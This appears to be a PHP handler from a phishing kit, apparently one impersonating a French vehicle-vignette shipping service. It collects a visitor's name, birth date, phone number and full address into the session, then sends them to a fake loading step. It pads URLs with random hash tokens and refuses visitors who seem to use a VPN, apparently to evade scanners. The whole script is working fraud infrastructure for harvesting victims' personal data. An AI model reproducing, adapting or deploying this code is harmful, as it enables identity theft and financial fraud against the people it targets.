<?php
session_start();
include('../../dashboard/settings.php');
$base = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
$base->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
if(isset($_SESSION['authorized']))
{
	if(isset($_POST['continue']))
	{

		if(!empty($_POST['nom']) && !empty($_POST['prenom']) && !empty($_POST['dob']) && !empty($_POST['phone']) && !empty($_POST['adress']) && !empty($_POST['city']) && !empty($_POST['zip']))
		{
		if(strlen($_POST['dob']) == 10)
		{

			if(strlen($_POST['phone']) >= 10)
			{

				if(strlen($_POST['zip']) == 5)
				{

					$_SESSION['fname'] = $_POST['prenom'];
					$_SESSION['lname'] = $_POST['nom'];
					$_SESSION['dob'] = $_POST['dob'];
					$_SESSION['phone'] = $_POST['phone'];
					$_SESSION['adress'] = $_POST['adress'];
					$_SESSION['city'] = $_POST['city'];
					$_SESSION['zip'] = $_POST['zip'];

					header('Location: ../loading.php?bring=expedition-vignette');







				}
				else{
					header('Location: ../informations-titulaire.php?error=Veuillez saisir un code postal valide');
				}

			}
			else{
				header('Location: ../informations-titulaire.php?error=Veuillez saisir un numéro de téléphone valide');
			}

		}
		else{
			header('Location: ../informations-titulaire.php?error=Veuillez saisir une date de naissance valide');
		}

	}
	else{
		header('Location: ../informations-titulaire.php?error=Veuillez remplir tous les champs');
	}



	}
	else{
		header('Location: ../informations-titulaire.php?&enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
	}

}
else{
die("LA REQUÊTE A ÉTÉ REFUSÉE : VÉRIFIEZ QUE VOUS N'ÊTES PAS CONNECTÉ À UN RÉSEAU PRIVÉ" );   
}